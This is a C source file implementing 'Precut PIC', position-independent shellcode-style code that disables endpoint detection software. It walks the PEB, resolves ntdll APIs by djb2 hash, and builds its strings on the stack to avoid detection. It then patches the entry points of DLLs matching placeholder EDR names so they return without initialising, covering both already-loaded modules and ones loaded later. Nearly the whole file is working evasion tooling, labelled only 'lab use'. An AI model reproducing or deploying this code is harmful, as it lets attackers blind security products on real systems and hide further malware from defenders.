/*
 * ========================================================================
 *  PRECUT PIC  --  position-independent, zero-CRT, zero-import variant
 * ========================================================================
 *
 * This file implements the Precut entry-point stubbing technique as
 * position-independent code suitable for embedding in loaders or
 * prepending to shellcode. It has:
 *
 *   - No C runtime dependency  (#pragma comment(linker, "/NODEFAULTLIB"))
 *   - No import table entries   (all APIs resolved via PEB + export walk)
 *   - No .rdata string refs     (every string is a stack-allocated array)
 *
 * Why stack strings?
 * ------------------
 * MSVC places string literals ("hello") in the .rdata section. A pointer
 * to .rdata encodes an absolute address, which breaks when the code is
 * copied to an arbitrary base (PIC). Stack-allocated arrays are built
 * from immediates embedded in .text instructions (mov byte [...], 'h'),
 * so they work at any address.
 *
 * API resolution
 * --------------
 * We walk the PEB's InMemoryOrderModuleList to find ntdll's base, then
 * parse its PE export directory to resolve two functions by hash:
 *
 *   - LdrRegisterDllNotification   (notification registration)
 *   - NtProtectVirtualMemory       (page protection, replaces kernel32's
 *                                   VirtualProtect so we never touch k32)
 *
 * The hash function is djb2 over the ASCII export name. Hashes are
 * pre-computed constants so no reference strings are needed at call sites.
 *
 * Usage
 * -----
 * Call precut_pic_entry() from a TLS callback, a reflective loader's
 * early init, or any code path that runs before NtTestAlert. The
 * function arms the PEB walk (Write A) and the load notification
 * (Write B), then returns.
 *
 * Build: run build.bat from a VS2022 x64 Developer Command Prompt.
 * It compiles, links, and extracts the raw .text section to a .bin file.
 *
 * x64 only. Lab use only. Not production.
 */

#pragma comment(linker, "/ENTRY:precut_pic_entry")
#pragma comment(linker, "/NODEFAULTLIB")

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#ifndef _WIN64
#error precut_pic.c: x64 only.
#endif

/* ========================================================================
 *  Minimal type declarations (no winternl.h to avoid CRT pull-in)
 * ========================================================================
 * We declare only what we touch. UNICODE_STRING and the PEB/LDR chain
 * are laid out to match x64 Windows 10/11.
 */

typedef struct _PIC_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} PIC_UNICODE_STRING;

typedef struct _PIC_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    PIC_UNICODE_STRING FullDllName;
    PIC_UNICODE_STRING BaseDllName;
} PIC_LDR_ENTRY;

typedef struct _PIC_PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
} PIC_PEB_LDR_DATA;

typedef struct _PIC_PEB {
    BYTE               Reserved1[2];
    BYTE               BeingDebugged;
    BYTE               Reserved2[1];
    PVOID              Reserved3[2];
    PIC_PEB_LDR_DATA  *Ldr;
} PIC_PEB;

/* Notification structures (undocumented ntdll, stable Win10/11) */
typedef struct _PIC_DLL_NOTIFICATION_DATA {
    ULONG               Flags;
    PIC_UNICODE_STRING  *FullDllName;
    PIC_UNICODE_STRING  *BaseDllName;
    PVOID                DllBase;
    ULONG                SizeOfImage;
} PIC_DLL_NOTIFICATION_DATA;

typedef union _PIC_DLL_NOTIFICATION {
    PIC_DLL_NOTIFICATION_DATA Loaded;
} PIC_DLL_NOTIFICATION;

#define PIC_REASON_LOADED 1

typedef VOID (CALLBACK *PIC_NOTIFICATION_FN)(
    ULONG, PIC_DLL_NOTIFICATION *, PVOID);

typedef LONG NTSTATUS_T;

/* Function pointer types for the two ntdll exports we resolve */
typedef NTSTATUS_T (NTAPI *fn_LdrRegisterDllNotification)(
    ULONG, PIC_NOTIFICATION_FN, PVOID, PVOID *);

typedef NTSTATUS_T (NTAPI *fn_NtProtectVirtualMemory)(
    HANDLE, PVOID *, SIZE_T *, ULONG, ULONG *);

/* ========================================================================
 *  djb2 hash and pre-computed constants
 * ========================================================================
 * djb2: hash = hash * 33 + c, seeded at 5381. Computed over the ASCII
 * export name including case. The constants below are verified in the
 * comment; change them if you change the hash function.
 */

#define HASH_LdrRegisterDllNotification   0xED7FA36Fu  /* djb2("LdrRegisterDllNotification") */
#define HASH_NtProtectVirtualMemory       0x082962C8u  /* djb2("NtProtectVirtualMemory")     */

static unsigned int pic_djb2(const char *name)
{
    unsigned int h = 5381;
    while (*name) {
        h = h * 33 + (unsigned char)*name;
        name++;
    }
    return h;
}

/* ========================================================================
 *  PEB walk: find a module base by position in the loader list
 * ======================================================================== */

static PIC_PEB *pic_get_peb(void)
{
    return (PIC_PEB *)__readgsqword(0x60);
}

/* Find ntdll: it is always the second entry in InMemoryOrderModuleList
 * (first is the exe itself). */
static PVOID pic_find_ntdll(void)
{
    PIC_PEB *peb = pic_get_peb();
    LIST_ENTRY *head, *cur;
    int index = 0;

    if (!peb || !peb->Ldr) return NULL;
    head = &peb->Ldr->InMemoryOrderModuleList;
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        if (++index == 2) {
            PIC_LDR_ENTRY *mod = CONTAINING_RECORD(
                cur, PIC_LDR_ENTRY, InMemoryOrderLinks);
            return mod->DllBase;
        }
    }
    return NULL;
}

/* ========================================================================
 *  Export table walk: resolve a function by djb2 hash
 * ======================================================================== */

static PVOID pic_resolve_export(PVOID module_base, unsigned int target_hash)
{
    BYTE *base = (BYTE *)module_base;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    IMAGE_DATA_DIRECTORY *exp_dir;
    IMAGE_EXPORT_DIRECTORY *exports;
    DWORD *names, *functions;
    WORD *ordinals;
    DWORD i;

    if (!base) return NULL;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    exp_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_dir->VirtualAddress || !exp_dir->Size) return NULL;

    exports = (IMAGE_EXPORT_DIRECTORY *)(base + exp_dir->VirtualAddress);
    names     = (DWORD *)(base + exports->AddressOfNames);
    functions = (DWORD *)(base + exports->AddressOfFunctions);
    ordinals  = (WORD  *)(base + exports->AddressOfNameOrdinals);

    for (i = 0; i < exports->NumberOfNames; i++) {
        const char *name = (const char *)(base + names[i]);
        if (pic_djb2(name) == target_hash) {
            DWORD func_rva = functions[ordinals[i]];
            /* Check for forwarded export (RVA inside the export directory) */
            if (func_rva >= exp_dir->VirtualAddress &&
                func_rva <  exp_dir->VirtualAddress + exp_dir->Size)
                return NULL;  /* forwarded — not handled */
            return (PVOID)(base + func_rva);
        }
    }
    return NULL;
}

/* ========================================================================
 *  Resolved API pointers (file-scope, set once by precut_pic_entry)
 * ======================================================================== */

static fn_NtProtectVirtualMemory  g_NtProtect = NULL;
static fn_LdrRegisterDllNotification g_LdrRegister = NULL;
static PVOID g_cookie = NULL;

/* ========================================================================
 *  Name matching (same logic as precut.h, PIC-safe)
 * ======================================================================== */

static wchar_t pic_fold(wchar_t c)
{
    return (c >= L'A' && c <= L'Z') ? (wchar_t)(c + 32) : c;
}

static int pic_copy_uname(const PIC_UNICODE_STRING *u, wchar_t *out, int cap)
{
    int n, i;
    if (!u || !u->Buffer || u->Length == 0 || cap < 2) return 0;
    n = (int)(u->Length / sizeof(wchar_t));
    if (n >= cap) n = cap - 1;
    for (i = 0; i < n; i++) out[i] = u->Buffer[i];
    out[n] = 0;
    return n;
}

static int pic_prefix_dll(const wchar_t *name, const wchar_t *prefix)
{
    int i = 0, n = 0;
    if (!name || !prefix) return 0;
    while (prefix[i]) {
        if (pic_fold(name[i]) != pic_fold(prefix[i])) return 0;
        i++;
    }
    if (!name[i]) return 0;
    while (name[n]) n++;
    if (n < 4) return 0;
    return pic_fold(name[n-4]) == L'.'
        && pic_fold(name[n-3]) == L'd'
        && pic_fold(name[n-2]) == L'l'
        && pic_fold(name[n-1]) == L'l';
}

static int pic_wicmp(const wchar_t *a, const wchar_t *b)
{
    while (*a && *b) {
        wchar_t la = pic_fold(*a), lb = pic_fold(*b);
        if (la != lb) return (int)(la - lb);
        a++; b++;
    }
    return (int)(pic_fold(*a) - pic_fold(*b));
}

/*
 * ========================================================================
 *  TARGET DLL MATCHING  --  REPLACE THESE PLACEHOLDERS
 * ========================================================================
 *
 * Stack-allocated wide strings for each target. Replace the array
 * contents with the real DLL names from your lab environment.
 *
 * Stack strings are mandatory for PIC: a string literal like
 * L"edr_hook" goes into .rdata, making the code position-dependent.
 * Stack arrays are built from immediate operands in .text instructions.
 */
static int pic_is_target(const wchar_t *basename)
{
    /* Placeholder A: prefix "edr_hook" */
    {
        wchar_t p[] = { 'e','d','r','_','h','o','o','k', 0 };
        if (pic_prefix_dll(basename, p)) return 1;
    }
    /* Placeholder B: prefix "edr_dev" */
    {
        wchar_t p[] = { 'e','d','r','_','d','e','v', 0 };
        if (pic_prefix_dll(basename, p)) return 1;
    }
    /* Placeholder C: exact "edrclient64.dll" */
    {
        wchar_t n[] = { 'e','d','r','c','l','i','e','n','t','6','4','.','d','l','l', 0 };
        if (pic_wicmp(basename, n) == 0) return 1;
    }
    /* Placeholder D: exact "edrclient.dll" */
    {
        wchar_t n[] = { 'e','d','r','c','l','i','e','n','t','.','d','l','l', 0 };
        if (pic_wicmp(basename, n) == 0) return 1;
    }
    return 0;
}

/* ========================================================================
 *  Entry-point stubbing (uses NtProtectVirtualMemory, not VirtualProtect)
 * ======================================================================== */

static void pic_stub_entry(PVOID dll_base)
{
    BYTE *base = (BYTE *)dll_base;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    DWORD ep_rva;
    BYTE *ep;
    PVOID region;
    SIZE_T region_size;
    ULONG old_prot;

    /* B8 01000000 C3 = mov eax, 1 ; ret */
    BYTE stub[6];
    stub[0] = 0xB8; stub[1] = 0x01; stub[2] = 0x00;
    stub[3] = 0x00; stub[4] = 0x00; stub[5] = 0xC3;

    if (!base || !g_NtProtect) return;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
    if (!ep_rva || (SIZE_T)ep_rva + 6 > nt->OptionalHeader.SizeOfImage)
        return;
    ep = base + ep_rva;

    /* Idempotency */
    if (ep[0] == 0xB8 && ep[1] == 0x01 && ep[2] == 0x00 &&
        ep[3] == 0x00 && ep[4] == 0x00 && ep[5] == 0xC3)
        return;

    /* NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, RWX, &old)
     * NtCurrentProcess() = (HANDLE)-1 */
    region = (PVOID)ep;
    region_size = sizeof(stub);
    old_prot = 0;
    if (g_NtProtect((HANDLE)(LONG_PTR)-1, &region, &region_size,
                     PAGE_EXECUTE_READWRITE, &old_prot) < 0)
        return;

    /* Write the 6-byte stub manually (no CopyMemory / memcpy) */
    ep[0] = stub[0]; ep[1] = stub[1]; ep[2] = stub[2];
    ep[3] = stub[3]; ep[4] = stub[4]; ep[5] = stub[5];

    /* Restore original protection */
    region = (PVOID)ep;
    region_size = sizeof(stub);
    g_NtProtect((HANDLE)(LONG_PTR)-1, &region, &region_size,
                old_prot, &old_prot);
}

/* ========================================================================
 *  Write A: PEB walk for already-mapped targets
 * ======================================================================== */

static void pic_peb_stub(void)
{
    PIC_PEB *peb = pic_get_peb();
    LIST_ENTRY *head, *cur;
    if (!peb || !peb->Ldr) return;
    head = &peb->Ldr->InMemoryOrderModuleList;
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        PIC_LDR_ENTRY *mod = CONTAINING_RECORD(
            cur, PIC_LDR_ENTRY, InMemoryOrderLinks);
        wchar_t name[256];
        if (!pic_copy_uname(&mod->BaseDllName, name, 256)) continue;
        if (pic_is_target(name) && mod->DllBase)
            pic_stub_entry(mod->DllBase);
    }
}

/* ========================================================================
 *  Write B: DLL load notification callback
 * ======================================================================== */

static VOID CALLBACK pic_on_loaded(
    ULONG reason, PIC_DLL_NOTIFICATION *data, PVOID ctx)
{
    wchar_t name[256];
    (void)ctx;
    if (reason != PIC_REASON_LOADED) return;
    if (!data || !data->Loaded.BaseDllName) return;
    if (!pic_copy_uname(data->Loaded.BaseDllName, name, 256)) return;
    if (!pic_is_target(name)) return;
    pic_stub_entry(data->Loaded.DllBase);
}

/* ========================================================================
 *  Entry point
 * ========================================================================
 * Call this from a TLS callback, a reflective loader's init, or any code
 * that runs before NtTestAlert drains the APC queue. It resolves the two
 * ntdll APIs it needs, walks the PEB, registers the notification, and
 * returns. The process can continue normally — Write B fires later when
 * the loader maps each target DLL.
 */
void precut_pic_entry(void)
{
    PVOID ntdll;

    /* Resolve ntdll base from PEB (second module in memory order) */
    ntdll = pic_find_ntdll();
    if (!ntdll) return;

    /* Resolve NtProtectVirtualMemory by djb2 hash */
    g_NtProtect = (fn_NtProtectVirtualMemory)pic_resolve_export(
        ntdll, HASH_NtProtectVirtualMemory);
    if (!g_NtProtect) return;

    /* Resolve LdrRegisterDllNotification by djb2 hash */
    g_LdrRegister = (fn_LdrRegisterDllNotification)pic_resolve_export(
        ntdll, HASH_LdrRegisterDllNotification);

    /* Write A: stub anything already mapped */
    pic_peb_stub();

    /* Write B: register for future maps */
    if (g_LdrRegister)
        g_LdrRegister(0, pic_on_loaded, NULL, &g_cookie);
}
